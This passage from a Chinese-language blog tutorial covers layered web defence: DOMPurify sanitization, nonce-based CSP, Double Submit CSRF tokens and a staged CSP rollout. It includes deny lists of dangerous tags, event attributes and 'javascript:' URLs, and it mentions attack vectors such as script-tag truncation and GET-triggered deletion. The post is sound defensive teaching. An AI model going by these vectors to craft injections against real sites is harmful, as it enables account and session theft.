+  ALLOWED_ATTR: [&#x27;class&#x27;, &#x27;style&#x27;], // 注意：style 仍可能藏 url()，见下方 hook
+  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i, // 禁止 javascript: / data:
+  FORBID_TAGS: [&#x27;script&#x27;, &#x27;style&#x27;, &#x27;iframe&#x27;, &#x27;object&#x27;, &#x27;embed&#x27;, &#x27;form&#x27;],
+  FORBID_ATTR: [&#x27;onerror&#x27;, &#x27;onclick&#x27;, &#x27;onload&#x27;, &#x27;onmouseover&#x27;],
+} as const
+
+// 额外的 hook：清洗 style 里的危险表达式（expression()/url(javascript:)）
+DOMPurify.addHook(&#x27;uponSanitizeAttribute&#x27;, (node, data) =&gt; {
+  if (data.attrName === &#x27;style&#x27;) {
+    const v = data.attrValue || &#x27;&#x27;
+    if (/expression\s*\(|javascript:|url\s*\(/i.test(v)) {
+      data.keepAttr = false // 直接丢弃该 style
+    }
+  }
+})
+
+export function sanitizeRichText(raw: string): string {
+  // RETURN_TRUSTED_TYPE 在 Node 端不生效，这里返回 string 即可
+  return DOMPurify.sanitize(raw, {
+    ...PURIFY_CONFIG,
+    USE_PROFILES: { html: true },
+  })
+}</code></pre></figure>
+<figure class="highlight ts"><pre><code class="language-ts">// server/render.ts —— 用 nonce 渲染页面，配合严格 CSP
+import crypto from &#x27;node:crypto&#x27;
+import { sanitizeRichText } from &#x27;./sanitize&#x27;
+
+export function renderProductPage(req, res, product) {
+  // 1. 每次请求生成一次性 nonce（务必用密码学随机）
+  const nonce = crypto.randomBytes(16).toString(&#x27;base64&#x27;)
+
+  // 2. 设置严格 CSP，nonce 与页面内联脚本对应
+  res.setHeader(
+    &#x27;Content-Security-Policy&#x27;,
+    [
+      &quot;default-src &#x27;self&#x27;&quot;,
+      `script-src &#x27;self&#x27; &#x27;nonce-${nonce}&#x27; &#x27;strict-dynamic&#x27;`,
+      &quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;, // 谨慎：样式内联风险较低，但最好也 nonce 化
+      &quot;img-src &#x27;self&#x27; https: data:&quot;,
+      &quot;object-src &#x27;none&#x27;&quot;,
+      &quot;base-uri &#x27;self&#x27;&quot;,
+      &quot;frame-ancestors &#x27;none&#x27;&quot;,
+      &quot;report-uri /csp-report&quot;,
+    ].join(&#x27;; &#x27;)
+  )
+  // 同时设置 Cookie 安全属性
+  res.setHeader(
+    &#x27;Set-Cookie&#x27;,
+    `session=${product.sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/`
+  )
+
+  // 3. 富文本先 sanitize，再注入模板
+  const safeSpec = sanitizeRichText(product.specHtml)
+
+  // 4. 内联脚本必须带 nonce（示例：注入初始状态）
+  const html = `
+    &lt;!doctype html&gt;
+    &lt;html&gt;
+      &lt;body&gt;
+        &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;spec&quot;&gt;${safeSpec}&lt;/div&gt;
+        &lt;script nonce=&quot;${nonce}&quot;&gt;
+          window.__INITIAL_STATE__ = ${JSON.stringify(product.state)}
+        &lt;/script&gt;
+        &lt;script nonce=&quot;${nonce}&quot; src=&quot;/assets/app.js&quot;&gt;&lt;/script&gt;
+      &lt;/body&gt;
+    &lt;/html&gt;`
+  res.status(200).send(html)
+}</code></pre></figure>
+<p><strong>要点</strong>：</p>
+<ul>
+<li>sanitize 在<strong>服务端</strong>做，前端拿到的就是"已净化"的字符串，前端可以直接 <code>v-html</code>（但仍建议前端不信任任何来源）；</li>
+</ul>
+<ul>
+<li>nonce 必须<strong>每次请求随机生成</strong>，绝不能复用或写死；</li>
+</ul>
+<ul>
+<li><code>JSON.stringify</code> 注入内联状态时，要防 <code></script></code> 截断攻击——生产环境建议用 <code>serialize-javascript</code> 库（它会把 <code><</code> 转义为 <code>\u003C</code>）。</li>
+</ul>
+<h3 id="示例-2-前端-CSRF-防护-Double-Submit-Cookie-Origin-校验"><a href="#示例-2-前端-CSRF-防护-Double-Submit-Cookie-Origin-校验" class="headerlink" title="示例 2：前端 CSRF 防护 —— Double Submit Cookie + Origin 校验"></a>示例 2：前端 CSRF 防护 —— Double Submit Cookie + Origin 校验</h3>
+<p>思路：<strong>服务端下发一个 <code>csrf</code> Cookie（非 HttpOnly，供 JS 读取），前端在请求头里带上它；服务端比较 header 与 Cookie 是否一致</strong>（Double Submit），并额外校验 <code>Origin</code>。这样攻击者既读不到 Cookie（跨站拿不到），也伪造不了 header。</p>
+<figure class="highlight ts"><pre><code class="language-ts">// client/csrf.ts —— 前端统一注入 CSRF token
+function readCookie(name: string): string | null {
+  const m = document.cookie.match(new RegExp(&#x27;(?:^|; )&#x27; + name + &#x27;=([^;]*)&#x27;))
+  return m ? decodeURIComponent(m[1]) : null
+}
+
+// 对状态变更请求统一加头；配合 fetch 封装
+export async function safeFetch(input: RequestInfo, init: RequestInit = {}) {
+  const method = (init.method || &#x27;GET&#x27;).toUpperCase()
+  const needCsrf = [&#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;PATCH&#x27;, &#x27;DELETE&#x27;].includes(method)
+  const headers = new Headers(init.headers)
+  if (needCsrf) {
+    const token = readCookie(&#x27;csrf_token&#x27;)
+    if (token) headers.set(&#x27;X-CSRF-Token&#x27;, token)
+    headers.set(&#x27;Content-Type&#x27;, headers.get(&#x27;Content-Type&#x27;) || &#x27;application/json&#x27;)
+  }
+  return fetch(input, { ...init, headers, credentials: &#x27;same-origin&#x27; })
+}</code></pre></figure>
+<figure class="highlight ts"><pre><code class="language-ts">// server/csrf.ts —— Express 中间件
+import crypto from &#x27;node:crypto&#x27;
+import type { Request, Response, NextFunction } from &#x27;express&#x27;
+
+const SAFE_METHODS = new Set([&#x27;GET&#x27;, &#x27;HEAD&#x27;, &#x27;OPTIONS&#x27;])
+
+export function issueCsrfCookie(res: Response) {
+  const token = crypto.randomBytes(24).toString(&#x27;base64&#x27;)
+  res.cookie(&#x27;csrf_token&#x27;, token, {
+    httpOnly: false, // 必须可被 JS 读取
+    secure: true,
+    sameSite: &#x27;lax&#x27;,
+    path: &#x27;/&#x27;,
+  })
+  return token
+}
+
+export function csrfProtection(req: Request, res: Response, next: NextFunction) {
+  if (SAFE_METHODS.has(req.method)) return next()
+
+  // 1. Origin / Referer 校验（防简单请求绕过）
+  const origin = req.headers.origin
+  const allowedOrigins = new Set([&#x27;https://shop.example.com&#x27;])
+  if (origin &amp;&amp; !allowedOrigins.has(origin)) {
+    return res.status(403).json({ error: &#x27;bad origin&#x27; })
+  }
+
+  // 2. Double Submit：header 与 cookie 一致
+  const cookieToken = req.cookies?.csrf_token
+  const headerToken = req.headers[&#x27;x-csrf-token&#x27;]
+  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
+    return res.status(403).json({ error: &#x27;csrf token mismatch&#x27; })
+  }
+
+  // 3. 可选：绑定会话（更强，但需要服务端存储）
+  // if (cookieToken !== req.session.csrfToken) return res.status(403)...
+
+  next()
+}</code></pre></figure>
+<p><strong>为什么 Double Submit 有效</strong>：攻击者从 <code>evil.example</code> 发起请求时，浏览器会带上目标站的 Cookie，但<strong>攻击者的 JS 无法读取 <code>bank.example</code> 的 Cookie</strong>（同源策略），因此无法在 header 里设置相同的 token。服务端比较两者不一致即拒绝。</p>
+<p><strong>局限</strong>：如果目标站存在子域 XSS 或 Cookie 注入（如子域可写父域 Cookie），Double Submit 会被绕过。所以生产环境通常叠加<strong>服务端会话绑定</strong>的 token（如 Spring Security 的 <code>CsrfTokenRepository</code>）。</p>
+<h3 id="示例-3-CSP-违规上报-渐进式上线"><a href="#示例-3-CSP-违规上报-渐进式上线" class="headerlink" title="示例 3：CSP 违规上报 + 渐进式上线"></a>示例 3：CSP 违规上报 + 渐进式上线</h3>
+<p>思路：<strong>先只上报（<code>Content-Security-Policy-Report-Only</code>），收集真实违规，再逐步收紧到强制策略</strong>。这是大厂上线 CSP 的标准姿势，避免一刀切打挂业务。</p>
+<figure class="highlight ts"><pre><code class="language-ts">// server/csp.ts —— 两阶段上线 + 上报收集
+import type { Request, Response } from &#x27;express&#x27;
+
+const REPORT_ONLY = process.env.CSP_ENFORCE !== &#x27;true&#x27;
+
+export function cspMiddleware(req: Request, res: Response, next: NextFunction) {
+  const nonce = res.locals.nonce // 由上游中间件生成
+  const policy = [
+    &quot;default-src &#x27;self&#x27;&quot;,
+    `script-src &#x27;self&#x27; &#x27;nonce-${nonce}&#x27; &#x27;strict-dynamic&#x27;`,
+    &quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;,
+    &quot;img-src &#x27;self&#x27; https: data:&quot;,
+    &quot;connect-src &#x27;self&#x27; https://api.example.com&quot;,
+    &quot;object-src &#x27;none&#x27;&quot;,
+    &quot;base-uri &#x27;self&#x27;&quot;,
+    &quot;frame-ancestors &#x27;none&#x27;&quot;,
+    &#x27;report-uri /csp-report&#x27;,
+  ].join(&#x27;; &#x27;)
+
+  res.setHeader(
+    REPORT_ONLY ? &#x27;Content-Security-Policy-Report-Only&#x27; : &#x27;Content-Security-Policy&#x27;,
+    policy
+  )
+  next()
+}
+
+// 违规上报收集端点（注意限流与脱敏）
+export function cspReportHandler(req: Request, res: Response) {
+  const report = req.body?.[&#x27;csp-report&#x27;] ?? req.body
+  // 只记录必要字段，避免日志注入
+  const safe = {
+    blocked: String(report?.[&#x27;blocked-uri&#x27;] ?? &#x27;&#x27;).slice(0, 512),
+    directive: String(report?.[&#x27;violated-directive&#x27;] ?? &#x27;&#x27;).slice(0, 128),
+    doc: String(report?.[&#x27;document-uri&#x27;] ?? &#x27;&#x27;).slice(0, 512),
+    ua: String(req.headers[&#x27;user-agent&#x27;] ?? &#x27;&#x27;).slice(0, 256),
+  }
+  // 丢进消息队列/日志系统做聚合分析
+  console.warn(&#x27;[CSP-REPORT]&#x27;, JSON.stringify(safe))
+  res.status(204).end()
+}</code></pre></figure>
+<p><strong>渐进式策略</strong>：</p>
+<ol>
+<li>先 <code>Report-Only</code> 跑 1~2 周，收集所有 <code>blocked-uri</code>；</li>
+<li>分析高频违规来源（往往是第三方 SDK、埋点脚本），逐个用 nonce/hash 或白名单放行；</li>
+<li>切到强制模式，同时保留 <code>report-uri</code> 持续监控；</li>
+<li>定期 review，逐步移除 <code>'unsafe-inline'</code>。</li>
+</ol>
+<hr>
+<h2 id="四-方案对比-三层防御的取舍"><a href="#四-方案对比-三层防御的取舍" class="headerlink" title="四、方案对比：三层防御的取舍"></a>四、方案对比：三层防御的取舍</h2>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>XSS 防护</th>
+<th>CSRF 防护</th>
+<th>CSP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主要手段</td>
+<td>输出编码 / sanitize / 框架自动转义</td>
+<td>SameSite + Token + Origin 校验</td>
+<td>声明式资源白名单</td>
+</tr><tr>
+<td>生效层次</td>
+<td>数据进入 DOM 前</td>
+<td>请求到达服务端前/时</td>
+<td>浏览器执行资源前</td>
+</tr><tr>
+<td>能否兜底</td>
+<td>否（一旦漏 sanitize 就中招）</td>
+<td>否（依赖浏览器支持）</td>
+<td><strong>能</strong>（拦截内联脚本执行）</td>
+</tr><tr>
+<td>性能开销</td>
+<td>低（字符串处理）</td>
+<td>低（一次比较）</td>
+<td>极低（浏览器原生）</td>
+</tr><tr>
+<td>主要坑</td>
+<td>上下文混淆（HTML/JS/URL/CSS 不同编码）</td>
+<td>子域 Cookie 注入、跨站合法 POST</td>
+<td><code>'unsafe-inline'</code>、nonce 复用、第三方脚本</td>
+</tr><tr>
+<td>适用场景</td>
+<td>所有渲染不可信内容的场景</td>
+<td>所有基于 Cookie 会话的状态变更接口</td>
+<td>所有对外 Web 应用</td>
+</tr></tbody></table>
+<p>再对比几个常见"替代方案"的局限：</p>
+<ul>
+<li><strong>只用 <code>escapeHtml</code></strong>：能防 HTML 注入，但防不住 <code>javascript:</code> URL、<code>onerror</code> 的 URL 上下文；而且它无法处理 <code><a href="..."></code> 里的协议。</li>
+</ul>
+<ul>
+<li><strong>只用 CSRF Token</strong>：如果 token 通过 URL 传递会泄露到 Referer / 日志；必须放 header 或 POST body。</li>
+</ul>
+<ul>
+<li><strong>只用 CSP</strong>：CSP 是兜底，不是替代。如果页面本身有 <code>eval</code>、<code>innerHTML</code> 等 sink，CSP 可能被 <code>'unsafe-eval'</code> 或动态加载绕过。</li>
+</ul>
+<p><strong>纵深防御的正确姿势</strong>：</p>
+<div class="mermaid">
+graph TD
+    A[不可信输入] --> B{输出上下文}
+    B -->|HTML| C[HTML 编码 / DOMPurify]
+    B -->|JS| D[JSON 序列化转义]
+    B -->|URL| E[协议白名单校验]
+    B -->|CSS| F[CSS 转义 / 禁用 expression]
+    C --> G[进入 DOM]
+    D --> G
+    E --> G
+    F --> G
+    G --> H{CSP 拦截}
+    H -->|nonce 匹配| I[执行]
+    H -->|违规| J[blocked + 上报]
+    K[状态变更请求] --> L{Origin 校验}
+    L --> M{SameSite Cookie}
+    M --> N{CSRF Token}
+    N --> O[业务处理]
+</div>
+<hr>
+<h2 id="五-最佳实践与避坑指南"><a href="#五-最佳实践与避坑指南" class="headerlink" title="五、最佳实践与避坑指南"></a>五、最佳实践与避坑指南</h2>
+<h3 id="XSS-侧"><a href="#XSS-侧" class="headerlink" title="XSS 侧"></a>XSS 侧</h3>
+<ol>
+<li><strong>默认全部转义，白名单才放行 HTML</strong>：React 的 <code>{content}</code>、Vue 的 <code>{{ }}</code> 默认安全；只有确认可信的富文本才用 <code>dangerouslySetInnerHTML</code> / <code>v-html</code>，且必须经过 DOMPurify。</li>
+<li><strong>区分输出上下文</strong>：HTML 文本、HTML 属性、JS 字符串、URL、CSS 各有各的编码方式，别用一套 <code>escapeHtml</code> 打天下。比如 URL 里要校验协议，JS 内联要防 <code></script></code>。</li>
+<li><strong>前端不信任任何来源</strong>：即使服务端做了 sanitize，前端最好再跑一次 DOMPurify（尤其是处理用户上传内容时）。</li>
+<li><strong>警惕 DOM Clobbering</strong>：<code><form id="x"><input name="y"></code> 可以污染 <code>document.x.y</code>，影响依赖全局变量的脚本。</li>
+<li><strong><code>v-html</code> 的替代</strong>：能用组件渲染的结构就别用 HTML 字符串；必须用时，用 <code>sanitize</code> + <code>Trusted Types</code>（见下）。</li>
+</ol>
+<h3 id="CSRF-侧"><a href="#CSRF-侧" class="headerlink" title="CSRF 侧"></a>CSRF 侧</h3>
+<ol>
+<li><strong>Cookie 三件套</strong>：<code>HttpOnly</code>（防 XSS 读 Cookie）+ <code>Secure</code>（仅 HTTPS）+ <code>SameSite=Lax</code>（默认防线）。</li>
+<li><strong>Token 放 header，不放 URL</strong>：避免 Referer 泄露和日志残留。</li>
+<li><strong>GET 不做状态变更</strong>：这是 CSRF 最经典的坑，<code>GET /delete?id=1</code> 会被 <code><img src></code> 触发。</li>
+<li><strong>校验 <code>Origin</code>，而非仅 <code>Referer</code></strong>：<code>Referer</code> 可能被隐私模式剥离，<code>Origin</code> 在跨站请求中更可靠。</li>
+<li><strong>子域隔离</strong>：把用户内容放在独立子域（如 <code>user-content.example.com</code>），避免子域 XSS 污染主域 Cookie。</li>
+</ol>
+<h3 id="CSP-侧"><a href="#CSP-侧" class="headerlink" title="CSP 侧"></a>CSP 侧</h3>
+<ol>
+<li><strong>坚决不用 <code>'unsafe-inline'</code></strong>：用 nonce 或 hash 替代；<code>'unsafe-eval'</code> 也尽量避免。</li>
+<li><strong>nonce 必须每次请求随机</strong>：复用 nonce 等于没有 nonce。</li>
+<li><strong><code>'strict-dynamic'</code> 是现代 SPA 的标配</strong>：让受信脚本动态加载的子资源也被信任，但注意它会忽略 host 白名单。</li>
+<li><strong><code>report-uri</code> 持续监控</strong>：CSP 不是设置了就完事，要持续收集违规并迭代。</li>
+<li><strong><code>frame-ancestors 'none'</code> + <code>X-Frame-Options: DENY</code></strong>：双保险防点击劫持（老浏览器只认后者）。</li>
+</ol>
+<h3 id="一个容易被忽视的高级话题-Trusted-Types"><a href="#一个容易被忽视的高级话题-Trusted-Types" class="headerlink" title="一个容易被忽视的高级话题：Trusted Types"></a>一个容易被忽视的高级话题：Trusted Types</h3>
+<p>现代浏览器（Chrome 83+）支持 <strong>Trusted Types</strong>，它把 <code>innerHTML</code>、<code>eval</code> 等危险 sink 变成"只接受 TrustedHTML 类型"的 API。开启后，字符串直接赋值给 <code>innerHTML</code> 会抛错：</p>
+<figure class="highlight "><pre><code>Content-Security-Policy: require-trusted-types-for &#x27;script&#x27;</code></pre></figure>
+<p>配合 DOMPurify 的 <code>createDOMPurify().sanitize</code> 返回 <code>TrustedHTML</code>，可以从<strong>类型系统层面</strong>杜绝 XSS 注入。这是目前最接近"编译期防御"的方案，值得在新项目中尝试。</p>
+<hr>
+<h2 id="六-总结"><a href="#六-总结" class="headerlink" title="六、总结"></a>六、总结</h2>
+<p>回到开头那个事故。如果团队当初做了三件事，损失可以避免：</p>
+<ol>
+<li><strong>服务端对 <code>specHtml</code> 做 DOMPurify 白名单净化</strong>（示例 1）——从源头切断注入；</li>
+<li><strong>登录 Cookie 设 <code>HttpOnly</code> + <code>SameSite=Lax</code></strong>——即使有 XSS 也偷不走会话；</li>
+<li><strong>上线严格 CSP（nonce + <code>object-src 'none'</code>）</strong>——即使漏网的内联脚本也被拦截。</li>
+</ol>
+<p>这三层不是"三选一"，而是"缺一不可"的纵深防御。我见过太多团队把"加了个 CSP header"当作安全工作的终点，结果策略里全是 <code>'unsafe-inline'</code>；也见过把 <code>v-html</code> 当作"只是渲染 HTML 而已"的工程师，直到被存储型 XSS 教育。</p>
+<p>最后留一个延伸思考：<strong>随着前端框架越来越"组件化"，XSS 的攻击面其实在收缩</strong>（因为默认转义覆盖了绝大多数场景），但<strong>供应链攻击面在扩大</strong>——第三方 SDK、npm 包、CDN 脚本都可能成为注入点。这意味着 CSP 中的 <code>'strict-dynamic'</code> 和 <strong>Subresource Integrity（SRI）</strong> 会越来越重要。安全不是一次性的 checklist，而是一条持续演进的防线。</p>
+<p>记住那个自助餐厅的比喻：<strong>XSS 是假菜单混进真菜单，CSRF 是拿你的会员卡替别人买单，CSP 是后厨的采购白名单</strong>。三者各守一段边界，才能让餐厅真正安全。</p>
+      </div>
+    </article>
+  </main>
+</div>
+<footer id="footer">
+  <div id="footer-wrap">
+    <div class="copyright">&copy;2020 - 2026 By 小曾</div>
+    <div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div>
+  </div>
+</footer>
+<script src="/js/utils.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({startOnLoad:true, theme:'default', securityLevel:'loose'});</script>
+<script src="/js/main.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/instant.page@latest" type="module"></script>
+</body>
+</html>
